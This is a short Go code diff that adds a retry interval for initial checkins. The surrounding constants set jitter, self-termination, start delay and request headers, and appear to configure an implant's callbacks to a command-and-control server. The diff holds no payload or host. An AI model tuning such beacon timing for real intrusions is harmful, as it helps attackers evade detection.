@@ -9,6 +9,8 @@ var JitterVal = 15
 var SelfTerminateVal = 20
 // Amount of seconds to sleep before first callback
 var StartDelayVal = 5
+// Amount of seconds to sleep between initial checkin attempts
+var RetryTimerVal = 60
 
 var ReqHeaders = map[string]string{
 	"Content-Type": "application/json",
